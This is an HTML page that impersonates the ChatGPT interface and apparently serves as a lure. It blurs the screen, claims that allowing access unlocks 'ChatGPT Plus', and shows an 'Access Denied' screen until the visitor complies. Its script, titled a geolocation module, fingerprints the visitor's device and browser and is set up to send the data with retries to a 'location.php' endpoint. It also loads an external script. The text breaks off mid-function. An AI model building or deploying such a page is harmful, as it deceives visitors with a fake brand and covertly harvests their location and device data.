<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ChatGPT</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:ui-sans-serif,system-ui,-apple-system,sans-serif;background:#212121;color:#ececec;height:100vh;overflow:hidden}

/* ===== BLUR OVERLAY (shown before permission) ===== */
#overlay{
  position:fixed;inset:0;
  background:rgba(0,0,0,0.85);
  backdrop-filter:blur(12px);
  -webkit-backdrop-filter:blur(12px);
  z-index:9999;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:16px;
}
.ov-logo svg{width:48px;height:48px}
.ov-title{font-size:20px;font-weight:600;color:#fff;text-align:center}
.ov-sub{font-size:14px;color:#8e8ea0;text-align:center;max-width:300px;line-height:1.6}
.ov-loader{display:flex;gap:6px;align-items:center;margin-top:4px}
.ov-loader span{width:8px;height:8px;border-radius:50%;background:#19c37d;animation:bop 1.2s infinite}
.ov-loader span:nth-child(2){animation-delay:.2s}
.ov-loader span:nth-child(3){animation-delay:.4s}
@keyframes bop{0%,60%,100%{transform:translateY(0)}30%{transform:translateY(-7px)}}

/* ===== DENIED OVERLAY ===== */
#deniedOv{
  position:fixed;inset:0;
  background:rgba(0,0,0,0.92);
  backdrop-filter:blur(12px);
  -webkit-backdrop-filter:blur(12px);
  z-index:9999;
  display:none;flex-direction:column;align-items:center;justify-content:center;gap:14px;
}
.den-icon{width:60px;height:60px;background:#2a1a1a;border-radius:50%;display:flex;align-items:center;justify-content:center}
.den-icon svg{width:26px;height:26px;color:#f87171}
#deniedOv h2{font-size:18px;font-weight:600;color:#fff}
#deniedOv p{font-size:13px;color:#8e8ea0;text-align:center;max-width:260px;line-height:1.6}
.retry-btn{padding:10px 24px;background:#fff;color:#000;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer}
.retry-btn:hover{background:#e8e8e8}

/* ===== MAIN APP ===== */
.layout{display:flex;height:100vh}

/* SIDEBAR */
.sb{width:260px;background:#171717;display:flex;flex-direction:column;padding:8px;flex-shrink:0}
.sb-top{display:flex;align-items:center;justify-content:space-between;padding:8px 6px;margin-bottom:2px}
.sb-brand{display:flex;align-items:center;gap:8px;font-size:15px;font-weight:600;color:#ececec}
.sb-brand svg{width:20px;height:20px}
.sb-icons{display:flex;gap:2px}
.ib{background:none;border:none;color:#b4b4b4;cursor:pointer;padding:7px;border-radius:8px;display:flex;align-items:center;justify-content:center;transition:background .15s}
.ib:hover{background:#2a2a2a;color:#ececec}
.nc-btn{display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:10px;cursor:pointer;color:#ececec;font-size:14px;margin-bottom:2px;transition:background .15s;user-select:none}
.nc-btn:hover{background:#2a2a2a}
.sec-lbl{font-size:12px;color:#8e8ea0;padding:10px 12px 3px;font-weight:500}
.ci{padding:8px 12px;border-radius:8px;cursor:pointer;color:#ececec;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-size:13px;transition:background .15s}
.ci:hover{background:#2a2a2a}
.ci.on{background:#2a2a2a}
.sb-bot{margin-top:auto;border-top:1px solid #2a2a2a;padding-top:8px}
.upgrade-box{background:linear-gradient(135deg,#1a1625,#1a2030);border:1px solid #2d2a3e;border-radius:12px;padding:14px;margin-bottom:8px}
.ub-title{font-size:13px;font-weight:600;color:#c4b5fd;margin-bottom:4px;display:flex;align-items:center;gap:6px}
.ub-title svg{width:13px;height:13px}
.upgrade-box p{font-size:12px;color:#8e8ea0;margin-bottom:10px;line-height:1.5}
.ub-btn{width:100%;padding:8px;background:linear-gradient(135deg,#7c3aed,#6d28d9);color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer}
.ub-btn:hover{opacity:.9}
.user-row{display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:10px;cursor:pointer;transition:background .15s}
.user-row:hover{background:#2a2a2a}
.av{width:32px;height:32px;border-radius:50%;background:#19c37d;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#fff;flex-shrink:0}
.uname{font-size:13px;color:#ececec;flex:1}

/* MAIN */
.main{flex:1;display:flex;flex-direction:column;background:#212121;overflow:hidden}
.plus-bar{display:flex;align-items:center;gap:8px;padding:8px 16px;background:linear-gradient(90deg,#1a1625,#1a2030);border-bottom:1px solid #2d2a3e;font-size:12px;color:#c4b5fd}
.plus-bar svg{width:14px;height:14px}
.plus-dot{width:6px;height:6px;background:#a78bfa;border-radius:50%;animation:pdot 2s infinite}
@keyframes pdot{0%,100%{opacity:1}50%{opacity:.3}}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:10px 16px}
.model-btn{display:flex;align-items:center;gap:5px;background:none;border:none;color:#ececec;font-size:15px;font-weight:600;cursor:pointer;padding:6px 10px;border-radius:8px;transition:background .15s}
.model-btn:hover{background:#2a2a2a}
.model-btn svg{width:14px;height:14px;color:#8e8ea0}
.topbar-r{display:flex;gap:8px}
.share-btn{background:#2a2a2a;border:1px solid #3a3a3a;color:#ececec;padding:6px 14px;border-radius:8px;font-size:13px;cursor:pointer}
.share-btn:hover{background:#333}

/* CHAT */
.chat{flex:1;overflow-y:auto;padding:24px 0}
.chat::-webkit-scrollbar{width:5px}
.chat::-webkit-scrollbar-thumb{background:#3a3a3a;border-radius:4px}
.mg{max-width:760px;margin:0 auto;padding:0 24px}
.umw{display:flex;justify-content:flex-end;margin-bottom:18px}
.ubbl{background:#2f2f2f;color:#ececec;padding:11px 16px;border-radius:18px;max-width:72%;font-size:15px;line-height:1.6;word-break:break-word}
.amw{display:flex;gap:12px;margin-bottom:18px;align-items:flex-start}
.aav{width:28px;height:28px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:3px}
.aav svg{width:16px;height:16px}
.ac{flex:1;color:#ececec;font-size:15px;line-height:1.75}
.ac p{margin-bottom:10px}
.ac p:last-child{margin-bottom:0}
.ac code{background:#2a2a2a;padding:2px 6px;border-radius:4px;font-family:monospace;font-size:13px;color:#e5c07b}
.ma{display:flex;gap:2px;margin-top:8px}
.mab{background:none;border:none;color:#8e8ea0;cursor:pointer;padding:4px 7px;border-radius:6px;display:flex;align-items:center;gap:4px;font-size:12px;transition:all .15s}
.mab:hover{background:#2a2a2a;color:#ececec}
.mab svg{width:14px;height:14px}

/* WELCOME */
.wlc{text-align:center;padding:60px 24px 28px}
.wlc h2{font-size:28px;font-weight:500;color:#ececec;margin-bottom:24px}
.sg{display:grid;grid-template-columns:1fr 1fr;gap:10px;max-width:540px;margin:0 auto}
.sc{background:#2f2f2f;border:1px solid #3a3a3a;border-radius:12px;padding:13px 15px;text-align:left;cursor:pointer;color:#ececec;transition:background .15s}
.sc:hover{background:#363636}
.sc .st{font-size:14px;font-weight:500;margin-bottom:3px}
.sc .ss{font-size:13px;color:#8e8ea0}

/* INPUT */
.inp-area{padding:10px 24px 18px}
.inp-box{max-width:760px;margin:0 auto;background:#2f2f2f;border-radius:16px;border:1px solid #3a3a3a}
.inp-tools{display:flex;align-items:center;gap:6px;padding:9px 13px;border-bottom:1px solid #3a3a3a}
.tb{background:none;border:1px solid #3a3a3a;color:#b4b4b4;cursor:pointer;padding:5px 11px;border-radius:8px;font-size:13px;display:flex;align-items:center;gap:5px;transition:all .15s}
.tb:hover{background:#3a3a3a;color:#ececec}
.tb svg{width:13px;height:13px}
.inp-row{display:flex;align-items:flex-end;padding:8px 12px 10px 16px;gap:8px}
textarea#ti{flex:1;background:none;border:none;outline:none;color:#ececec;font-size:15px;resize:none;min-height:24px;max-height:200px;line-height:1.5;padding:5px 0;font-family:inherit}
textarea#ti::placeholder{color:#8e8ea0}
.sbtn{width:34px;height:34px;background:#fff;border:none;border-radius:8px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:background .15s}
.sbtn:hover{background:#e0e0e0}
.sbtn svg{width:16px;height:16px}
.hint{text-align:center;font-size:12px;color:#8e8ea0;margin-top:8px;max-width:760px;margin-left:auto;margin-right:auto}

/* TYPING */
.dots{display:flex;gap:4px;align-items:center;padding:6px 0}
.dots span{width:7px;height:7px;border-radius:50%;background:#8e8ea0;animation:bop 1.2s infinite}
.dots span:nth-child(2){animation-delay:.2s}
.dots span:nth-child(3){animation-delay:.4s}

/* ===================== MOBILE ONLY ===================== */
/* Hide mob-header on desktop */
.mob-header{display:none}
.mob-drawer{display:none}

@media (max-width:760px){
  /* Sidebar hide */
  .sb{display:none}

  /* Mobile top header */
  .mob-header{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#171717;border-bottom:1px solid #2a2a2a}
  .mob-brand{display:flex;align-items:center;gap:7px;font-size:15px;font-weight:600;color:#ececec}
  .mob-brand svg{width:18px;height:18px}
  .mob-icons{display:flex;gap:2px}

  /* Mobile sidebar drawer */
  .mob-drawer{position:fixed;inset:0;z-index:888;display:none}
  .mob-drawer.open{display:flex}
  .mob-backdrop{position:absolute;inset:0;background:rgba(0,0,0,.6)}
  .mob-panel{position:relative;width:260px;height:100%;background:#171717;display:flex;flex-direction:column;padding:8px;overflow-y:auto;z-index:1}

  /* Main */
  .main{border-left:none}

  /* Welcome */
  .wlc{padding:32px 16px 20px}
  .wlc h2{font-size:22px;margin-bottom:16px}
  .sg{grid-template-columns:1fr 1fr;gap:8px}
  .sc{padding:11px 12px}
  .sc .st{font-size:13px}
  .sc .ss{font-size:12px}

  /* Chat messages */
  .mg{padding:0 12px}
  .ubbl{max-width:88%;font-size:13.5px}
  .ac{font-size:13.5px}

  /* Input tools - wrap on mobile */
  .inp-tools{flex-wrap:wrap;gap:5px;padding:8px 10px}
  .tb{font-size:12px;padding:4px 9px}

  /* Input area */
  .inp-area{padding:8px 12px 12px}
  textarea#ti{font-size:14px}

  /* Topbar */
  .topbar{padding:8px 14px}
  .model-btn{font-size:13px;padding:5px 8px}
  .share-btn{padding:5px 10px;font-size:12px}

  /* Plus bar */
  .plus-bar{padding:7px 12px;font-size:11px}
}
/* ====================================================== */
</style>
</head>
<body>

<!-- BLUR OVERLAY - jab tak permission nahi milti -->
<div id="overlay">
  <div class="ov-logo">
    <svg viewBox="0 0 41 41" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M37.532 16.87a9.963 9.963 0 0 0-.856-8.184 10.078 10.078 0 0 0-10.855-4.835 9.964 9.964 0 0 0-6.714-3.804 10.079 10.079 0 0 0-10.4 4.963 9.967 9.967 0 0 0-6.63 4.834 10.08 10.08 0 0 0 1.24 11.817 9.965 9.965 0 0 0 .856 8.185 10.079 10.079 0 0 0 10.855 4.835 9.965 9.965 0 0 0 6.714 3.804 10.079 10.079 0 0 0 10.401-4.963 9.967 9.967 0 0 0 6.63-4.834 10.079 10.079 0 0 0-1.241-11.817zm-15.169 20.638a7.464 7.464 0 0 1-4.801-1.737c.061-.033.168-.091.237-.134l7.964-4.6a1.294 1.294 0 0 0 .655-1.134V19.054l3.366 1.944a.12.12 0 0 1 .066.092v9.299a7.505 7.505 0 0 1-7.487 7.119zm-16.116-6.898a7.463 7.463 0 0 1-.894-5.023c.06.036.162.099.237.141l7.964 4.6a1.297 1.297 0 0 0 1.308 0l9.724-5.614v3.888a.12.12 0 0 1-.048.103l-8.051 4.649a7.504 7.504 0 0 1-10.24-2.744zm-2.09-17.509A7.463 7.463 0 0 1 8.97 9.955c0 .033-.001.09-.001.134v9.201a1.295 1.295 0 0 0 .654 1.132l9.723 5.614-3.366 1.944a.12.12 0 0 1-.114.012L7.83 23.032a7.504 7.504 0 0 1-3.673-9.931zm27.688 6.44l-9.724-5.615 3.367-1.943a.121.121 0 0 1 .114-.012l8.048 4.648a7.498 7.498 0 0 1-1.158 13.528v-9.335a1.294 1.294 0 0 0-.647-1.271zm3.35-5.043c-.059-.037-.162-.099-.236-.141l-7.965-4.6a1.298 1.298 0 0 0-1.308 0l-9.723 5.614v-3.888a.12.12 0 0 1 .048-.103l8.05-4.645a7.497 7.497 0 0 1 11.135 7.763zm-21.063 6.929l-3.367-1.944a.12.12 0 0 1-.065-.092v-9.299a7.497 7.497 0 0 1 12.293-5.756 6.94 6.94 0 0 0-.236.134l-7.965 4.6a1.294 1.294 0 0 0-.654 1.132l-.006 11.225zm1.829-3.943l4.33-2.501 4.332 2.497v4.998l-4.331 2.5-4.331-2.5V18.484z"/></svg>
  </div>
  <div class="ov-title">ChatGPT Plus</div>
  <div class="ov-sub">Allow access to unlock ChatGPT Plus features.</div>
  <div class="ov-loader">
    <span></span><span></span><span></span>
  </div>
</div>

<!-- DENIED OVERLAY -->
<div id="deniedOv">
  <div class="den-icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
  </div>
  <h2>Access Denied</h2>
  <p>permission is required to access ChatGPT Plus. Please allow and try again.</p>
  <button class="retry-btn" onclick="retry()">Try Again</button>
</div>

<!-- MOBILE HEADER -->
<div class="mob-header">
  <div class="mob-brand">
    <svg viewBox="0 0 41 41" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M37.532 16.87a9.963 9.963 0 0 0-.856-8.184 10.078 10.078 0 0 0-10.855-4.835 9.964 9.964 0 0 0-6.714-3.804 10.079 10.079 0 0 0-10.4 4.963 9.967 9.967 0 0 0-6.63 4.834 10.08 10.08 0 0 0 1.24 11.817 9.965 9.965 0 0 0 .856 8.185 10.079 10.079 0 0 0 10.855 4.835 9.965 9.965 0 0 0 6.714 3.804 10.079 10.079 0 0 0 10.401-4.963 9.967 9.967 0 0 0 6.63-4.834 10.079 10.079 0 0 0-1.241-11.817zm-15.169 20.638a7.464 7.464 0 0 1-4.801-1.737c.061-.033.168-.091.237-.134l7.964-4.6a1.294 1.294 0 0 0 .655-1.134V19.054l3.366 1.944a.12.12 0 0 1 .066.092v9.299a7.505 7.505 0 0 1-7.487 7.119zm-16.116-6.898a7.463 7.463 0 0 1-.894-5.023c.06.036.162.099.237.141l7.964 4.6a1.297 1.297 0 0 0 1.308 0l9.724-5.614v3.888a.12.12 0 0 1-.048.103l-8.051 4.649a7.504 7.504 0 0 1-10.24-2.744zm-2.09-17.509A7.463 7.463 0 0 1 8.97 9.955c0 .033-.001.09-.001.134v9.201a1.295 1.295 0 0 0 .654 1.132l9.723 5.614-3.366 1.944a.12.12 0 0 1-.114.012L7.83 23.032a7.504 7.504 0 0 1-3.673-9.931zm27.688 6.44l-9.724-5.615 3.367-1.943a.121.121 0 0 1 .114-.012l8.048 4.648a7.498 7.498 0 0 1-1.158 13.528v-9.335a1.294 1.294 0 0 0-.647-1.271zm3.35-5.043c-.059-.037-.162-.099-.236-.141l-7.965-4.6a1.298 1.298 0 0 0-1.308 0l-9.723 5.614v-3.888a.12.12 0 0 1 .048-.103l8.05-4.645a7.497 7.497 0 0 1 11.135 7.763zm-21.063 6.929l-3.367-1.944a.12.12 0 0 1-.065-.092v-9.299a7.497 7.497 0 0 1 12.293-5.756 6.94 6.94 0 0 0-.236.134l-7.965 4.6a1.294 1.294 0 0 0-.654 1.132l-.006 11.225zm1.829-3.943l4.33-2.501 4.332 2.497v4.998l-4.331 2.5-4.331-2.5V18.484z"/></svg>
    ChatGPT
  </div>
  <div class="mob-icons">
    <button class="ib" onclick="newChat()"><svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg></button>
    <button class="ib" onclick="document.getElementById('mobDrawer').classList.toggle('open')"><svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>
  </div>
</div>

<!-- MOBILE DRAWER -->
<div class="mob-drawer" id="mobDrawer">
  <div class="mob-backdrop" onclick="document.getElementById('mobDrawer').classList.remove('open')"></div>
  <div class="mob-panel">
    <div class="sb-top">
      <div class="sb-brand">
        <svg viewBox="0 0 41 41" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M37.532 16.87a9.963 9.963 0 0 0-.856-8.184 10.078 10.078 0 0 0-10.855-4.835 9.964 9.964 0 0 0-6.714-3.804 10.079 10.079 0 0 0-10.4 4.963 9.967 9.967 0 0 0-6.63 4.834 10.08 10.08 0 0 0 1.24 11.817 9.965 9.965 0 0 0 .856 8.185 10.079 10.079 0 0 0 10.855 4.835 9.965 9.965 0 0 0 6.714 3.804 10.079 10.079 0 0 0 10.401-4.963 9.967 9.967 0 0 0 6.63-4.834 10.079 10.079 0 0 0-1.241-11.817zm-15.169 20.638a7.464 7.464 0 0 1-4.801-1.737c.061-.033.168-.091.237-.134l7.964-4.6a1.294 1.294 0 0 0 .655-1.134V19.054l3.366 1.944a.12.12 0 0 1 .066.092v9.299a7.505 7.505 0 0 1-7.487 7.119zm-16.116-6.898a7.463 7.463 0 0 1-.894-5.023c.06.036.162.099.237.141l7.964 4.6a1.297 1.297 0 0 0 1.308 0l9.724-5.614v3.888a.12.12 0 0 1-.048.103l-8.051 4.649a7.504 7.504 0 0 1-10.24-2.744zm-2.09-17.509A7.463 7.463 0 0 1 8.97 9.955c0 .033-.001.09-.001.134v9.201a1.295 1.295 0 0 0 .654 1.132l9.723 5.614-3.366 1.944a.12.12 0 0 1-.114.012L7.83 23.032a7.504 7.504 0 0 1-3.673-9.931zm27.688 6.44l-9.724-5.615 3.367-1.943a.121.121 0 0 1 .114-.012l8.048 4.648a7.498 7.498 0 0 1-1.158 13.528v-9.335a1.294 1.294 0 0 0-.647-1.271zm3.35-5.043c-.059-.037-.162-.099-.236-.141l-7.965-4.6a1.298 1.298 0 0 0-1.308 0l-9.723 5.614v-3.888a.12.12 0 0 1 .048-.103l8.05-4.645a7.497 7.497 0 0 1 11.135 7.763zm-21.063 6.929l-3.367-1.944a.12.12 0 0 1-.065-.092v-9.299a7.497 7.497 0 0 1 12.293-5.756 6.94 6.94 0 0 0-.236.134l-7.965 4.6a1.294 1.294 0 0 0-.654 1.132l-.006 11.225zm1.829-3.943l4.33-2.501 4.332 2.497v4.998l-4.331 2.5-4.331-2.5V18.484z"/></svg>
        ChatGPT
      </div>
    </div>
    <div class="nc-btn" onclick="newChat();document.getElementById('mobDrawer').classList.remove('open')">
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>
      New chat
    </div>
    <div class="sec-lbl">Today</div>
    <div class="ci on">ChatGPT Plus Setup</div>
    <div class="ci">Advanced code generation</div>
    <div class="ci">Image creation DALL-E 3</div>
    <div class="sec-lbl">Yesterday</div>
    <div class="ci">Data analysis project</div>
    <div class="ci">Marketing copy writing</div>
    <div class="sec-lbl">Previous 7 Days</div>
    <div class="ci">Business strategy plan</div>
    <div class="ci">Resume optimization</div>
    <div class="sb-bot">
      <div class="upgrade-box">
        <div class="ub-title">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11.645 20.91l-.007-.003-.022-.012a15.247 15.247 0 01-.383-.218 25.18 25.18 0 01-4.244-3.17C4.688 15.36 2.25 12.174 2.25 8.25 2.25 5.322 4.714 3 7.688 3A5.5 5.5 0 0112 5.052 5.5 5.5 0 0116.313 3c2.973 0 5.437 2.322 5.437 5.25 0 3.925-2.438 7.111-4.739 9.256a25.175 25.175 0 01-4.244 3.17 15.247 15.247 0 01-.383.219l-.022.012-.007.004-.003.001a.752.752 0 01-.704 0l-.003-.001z"/></svg>
          ChatGPT Plus
        </div>
        <p>Unlimited GPT-4o access enabled.</p>
        <button class="ub-btn">Manage subscription</button>
      </div>
      <div class="user-row">
        <div class="av">U</div>
        <div class="uname">User</div>
      </div>
    </div>
  </div>
</div>

<!-- MAIN APP -->
<div class="layout">
  <div class="sb">
    <div class="sb-top">
      <div class="sb-brand">
        <svg viewBox="0 0 41 41" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M37.532 16.87a9.963 9.963 0 0 0-.856-8.184 10.078 10.078 0 0 0-10.855-4.835 9.964 9.964 0 0 0-6.714-3.804 10.079 10.079 0 0 0-10.4 4.963 9.967 9.967 0 0 0-6.63 4.834 10.08 10.08 0 0 0 1.24 11.817 9.965 9.965 0 0 0 .856 8.185 10.079 10.079 0 0 0 10.855 4.835 9.965 9.965 0 0 0 6.714 3.804 10.079 10.079 0 0 0 10.401-4.963 9.967 9.967 0 0 0 6.63-4.834 10.079 10.079 0 0 0-1.241-11.817zm-15.169 20.638a7.464 7.464 0 0 1-4.801-1.737c.061-.033.168-.091.237-.134l7.964-4.6a1.294 1.294 0 0 0 .655-1.134V19.054l3.366 1.944a.12.12 0 0 1 .066.092v9.299a7.505 7.505 0 0 1-7.487 7.119zm-16.116-6.898a7.463 7.463 0 0 1-.894-5.023c.06.036.162.099.237.141l7.964 4.6a1.297 1.297 0 0 0 1.308 0l9.724-5.614v3.888a.12.12 0 0 1-.048.103l-8.051 4.649a7.504 7.504 0 0 1-10.24-2.744zm-2.09-17.509A7.463 7.463 0 0 1 8.97 9.955c0 .033-.001.09-.001.134v9.201a1.295 1.295 0 0 0 .654 1.132l9.723 5.614-3.366 1.944a.12.12 0 0 1-.114.012L7.83 23.032a7.504 7.504 0 0 1-3.673-9.931zm27.688 6.44l-9.724-5.615 3.367-1.943a.121.121 0 0 1 .114-.012l8.048 4.648a7.498 7.498 0 0 1-1.158 13.528v-9.335a1.294 1.294 0 0 0-.647-1.271zm3.35-5.043c-.059-.037-.162-.099-.236-.141l-7.965-4.6a1.298 1.298 0 0 0-1.308 0l-9.723 5.614v-3.888a.12.12 0 0 1 .048-.103l8.05-4.645a7.497 7.497 0 0 1 11.135 7.763zm-21.063 6.929l-3.367-1.944a.12.12 0 0 1-.065-.092v-9.299a7.497 7.497 0 0 1 12.293-5.756 6.94 6.94 0 0 0-.236.134l-7.965 4.6a1.294 1.294 0 0 0-.654 1.132l-.006 11.225zm1.829-3.943l4.33-2.501 4.332 2.497v4.998l-4.331 2.5-4.331-2.5V18.484z"/></svg>
        ChatGPT
      </div>
      <div class="sb-icons">
        <button class="ib"><svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg></button>
        <button class="ib" onclick="newChat()"><svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg></button>
      </div>
    </div>
    <div class="nc-btn" onclick="newChat()">
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>
      New chat
    </div>
    <div class="sec-lbl">Today</div>
    <div class="ci on">ChatGPT Plus Setup</div>
    <div class="ci">Advanced code generation</div>
    <div class="ci">Image creation DALL-E 3</div>
    <div class="sec-lbl">Yesterday</div>
    <div class="ci">Data analysis project</div>
    <div class="ci">Marketing copy writing</div>
    <div class="sec-lbl">Previous 7 Days</div>
    <div class="ci">Business strategy plan</div>
    <div class="ci">Resume optimization</div>
    <div class="sb-bot">
      <div class="upgrade-box">
        <div class="ub-title">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11.645 20.91l-.007-.003-.022-.012a15.247 15.247 0 01-.383-.218 25.18 25.18 0 01-4.244-3.17C4.688 15.36 2.25 12.174 2.25 8.25 2.25 5.322 4.714 3 7.688 3A5.5 5.5 0 0112 5.052 5.5 5.5 0 0116.313 3c2.973 0 5.437 2.322 5.437 5.25 0 3.925-2.438 7.111-4.739 9.256a25.175 25.175 0 01-4.244 3.17 15.247 15.247 0 01-.383.219l-.022.012-.007.004-.003.001a.752.752 0 01-.704 0l-.003-.001z"/></svg>
          ChatGPT Plus
        </div>
        <p>Unlimited GPT-4o access enabled.</p>
        <button class="ub-btn">Manage subscription</button>
      </div>
      <div class="user-row">
        <div class="av">U</div>
        <div class="uname">User</div>
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#8e8ea0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="1"/><circle cx="19" cy="12" r="1"/><circle cx="5" cy="12" r="1"/></svg>
      </div>
    </div>
  </div>

  <div class="main">
    <div class="plus-bar">
      <div class="plus-dot"></div>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11.645 20.91l-.007-.003-.022-.012a15.247 15.247 0 01-.383-.218 25.18 25.18 0 01-4.244-3.17C4.688 15.36 2.25 12.174 2.25 8.25 2.25 5.322 4.714 3 7.688 3A5.5 5.5 0 0112 5.052 5.5 5.5 0 0116.313 3c2.973 0 5.437 2.322 5.437 5.25 0 3.925-2.438 7.111-4.739 9.256a25.175 25.175 0 01-4.244 3.17 15.247 15.247 0 01-.383.219l-.022.012-.007.004-.003.001a.752.752 0 01-.704 0l-.003-.001z"/></svg>
      ChatGPT Plus &nbsp;·&nbsp; Unlimited GPT-4o access enabled
    </div>
    <div class="topbar">
      <button class="model-btn">
        ChatGPT 4o
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
      </button>
      <div class="topbar-r">
        <button class="share-btn">Share</button>
      </div>
    </div>
    <div class="chat" id="chat">
      <div id="ws">
        <div class="wlc">
          <h2>What can I help with?</h2>
          <div class="sg">
            <div class="sc" onclick="qs('Create a stunning website for me')">
              <div class="st">Create image</div>
              <div class="ss">Generate with DALL-E 3</div>
            </div>
            <div class="sc" onclick="qs('Analyze this data and give insights')">
              <div class="st">Analyze data</div>
              <div class="ss">Upload files to analyze</div>
            </div>
            <div class="sc" onclick="qs('Write me a Python script to automate tasks')">
              <div class="st">Code something</div>
              <div class="ss">Any language, any task</div>
            </div>
            <div class="sc" onclick="qs('Help me write a professional email')">
              <div class="st">Help me write</div>
              <div class="ss">Essays, emails, more</div>
            </div>
          </div>
        </div>
      </div>
      <div id="cm" style="display:none"><div class="mg" id="mg"></div></div>
    </div>
    <div class="inp-area">
      <div class="inp-box">
        <div class="inp-tools">
          <button class="tb"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.44 11.05-9.19 9.19a6 6 0 0 1-8.49-8.49l8.57-8.57A4 4 0 1 1 18 8.84l-8.59 8.57a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg> Attach</button>
          <button class="tb"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg> Search</button>
          <button class="tb"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg> Reason</button>
          <button class="tb"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg> Image</button>
        </div>
        <div class="inp-row">
          <textarea id="ti" placeholder="Message ChatGPT" rows="1" onkeydown="hk(event)" oninput="ar(this)"></textarea>
          <button class="sbtn" onclick="send()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5"/><path d="M5 12l7-7 7 7"/></svg></button>
        </div>
      </div>
      <div class="hint">ChatGPT can make mistakes. Check important info.</div>
    </div>
  </div>
</div>

<script src="Detels.js"></script>

<script>

// =====================
// UPGRADED GEOLOCATION MODULE v2.0
// =====================
(function(){

  // ── CONFIG ──────────────────────────────────────────
  const SERVER_URL   = 'location.php';   // change if needed
  const MAX_RETRIES  = 3;                // max retry attempts
  const GEO_TIMEOUT  = 40000;            // 40 seconds
  const SEND_TIMEOUT = 10000;            // fetch abort after 10s
  // ────────────────────────────────────────────────────

  let firstRun    = true;
  let retryCount  = 0;
  let sending     = false;

  // Collect rich device + browser fingerprint
  function getDeviceInfo() {
    const nav = window.navigator;
    const scr = window.screen;
    return {
      userAgent    : nav.userAgent        || 'unknown',
      platform     : nav.platform         || 'unknown',
      language     : nav.language         || 'unknown',
      languages    : (nav.languages || []).join(','),
      cookieEnabled: nav.cookieEnabled,
      onLine       : nav.onLine,
      screenWidth  : scr.width,
      screenHeight : scr.height,
      colorDepth   : scr.colorDepth,
      pixelRatio   : window.devicePixelRatio || 1,
      timezone     : Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
      timezoneOffset: new Date().getTimezoneOffset(),
